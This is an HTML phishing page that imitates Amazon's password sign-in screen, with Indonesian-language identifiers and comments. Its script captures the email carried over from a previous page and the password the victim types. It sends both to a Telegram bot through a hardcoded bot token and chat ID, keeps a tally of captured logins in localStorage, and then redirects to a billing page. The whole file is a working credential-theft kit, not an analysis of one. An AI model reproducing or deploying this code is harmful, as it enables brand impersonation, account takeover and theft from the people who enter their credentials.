<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <script src="negara.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px 20px;
        }
        .logo {
            margin: 10px 0 25px;
        }
        .logo img {
            height: 35px;
        }
        .kotak {
            width: 100%;
            max-width: 348px;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #fff;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 15px;
        }
        .baris-email {
            font-size: 14px;
            color: #555;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ubah {
            color: #0066c0;
            text-decoration: none;
            font-size: 14px;
        }
        .label-baris {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 6px;
        }
        label {
            font-weight: 700;
            font-size: 13px;
        }
        .lupa {
            font-size: 13px;
        }
        .lupa a {
            color: #0066c0;
            text-decoration: none;
        }
        .input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 4px;
            font-size: 15px;
            height: 32px;
            margin-bottom: 20px;
            outline: none;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .tombol {
            width: 100%;
            padding: 6px;
            background: #ffd814;
            border: 1px solid #fcd200;
            border-radius: 8px;
            font-size: 14px;
            height: 40px;
            cursor: pointer;
        }
        .tombol:disabled {
            background: #e9e9e9;
            border-color: #ccc;
            cursor: not-allowed;
        }
        .bawah {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e7e7e7;
            width: 100%;
            max-width: 100%;
            text-align: center;
            font-size: 11px;
            color: #555;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    
    <div class="kotak">
        <h1 id="judulHalaman">Sign in</h1>
        
        <div class="baris-email">
            <span id="tampilEmail"></span>
            <a href="amazon.html" class="ubah" id="teksUbah">Change</a>
        </div>
        
        <div class="label-baris">
            <span id="labelSandi">Password</span>
            <span class="lupa"><a href="#" id="teksLupa">Forgot password?</a></span>
        </div>
        
        <input type="password" id="sandi" class="input">
        
        <button id="masuk" class="tombol" disabled>Sign in</button>
    </div>
    
    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
        <p style="margin-top:8px; color:#767676;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

<script>
// === Ambil pengaturan dari panel ===
const token = localStorage.getItem('telegram_token') || '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
const chatid = localStorage.getItem('telegram_chatid') || '7808815199';

// === Ambil email dari halaman sebelumnya ===
let email = localStorage.getItem('email_pengguna');
if (!email) {
    window.location.href = 'amazon.html';
} else {
    document.getElementById('tampilEmail').textContent = email;
}

// === Terjemahan otomatis ===
async function terjemahkan() {
    await mulaiDeteksi();
    const bahasa = localStorage.getItem('bahasa') || 'en';
    const teks = TERJEMAHAN[bahasa] || TERJEMAHAN.en;
    
    document.getElementById('judulHalaman').textContent = teks.judul;
    document.getElementById('labelSandi').textContent = teks.pass_label;
    document.getElementById('masuk').textContent = teks.masuk;
}
terjemahkan();

// === Cek kolom ===
const sandiInput = document.getElementById('sandi');
const tombolMasuk = document.getElementById('masuk');

sandiInput.addEventListener('input', function() {
    tombolMasuk.disabled = !sandiInput.value.trim();
});

sandiInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && sandiInput.value.trim()) {
        kirimData();
    }
});

tombolMasuk.addEventListener('click', kirimData);

async function kirimData() {
    const sandi = sandiInput.value.trim();
    if (!sandi) return;
    
    // Simpan ke localStorage
    localStorage.setItem('kata_sandi', sandi);
    
    // Simpan ke daftar login di panel
    const daftarLogin = JSON.parse(localStorage.getItem('data_login') || '[]');
    daftarLogin.push({
        email: email,
        pass: sandi,
        waktu: new Date().toLocaleString('id-ID')
    });
    localStorage.setItem('data_login', JSON.stringify(daftarLogin));
    
    // Tambah penghitung
    localStorage.setItem('stat_login', parseInt(localStorage.getItem('stat_login') || 0) + 1);
    localStorage.setItem('stat_total', parseInt(localStorage.getItem('stat_total') || 0) + 1);
    
    // Kirim ke Telegram
    const pesan = `🔐 *LOGIN*\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n🔑 Password: ${sandi}\n━━━━━━━━━━━━━━━━━━━━━`;
    
    tombolMasuk.disabled = true;
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatid,
                text: pesan,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Gagal kirim ke Telegram:', e);
    }
    
    // Lanjut ke halaman berikutnya
    window.location.href = 'billing.html';
}
</script>
</body>
</html>
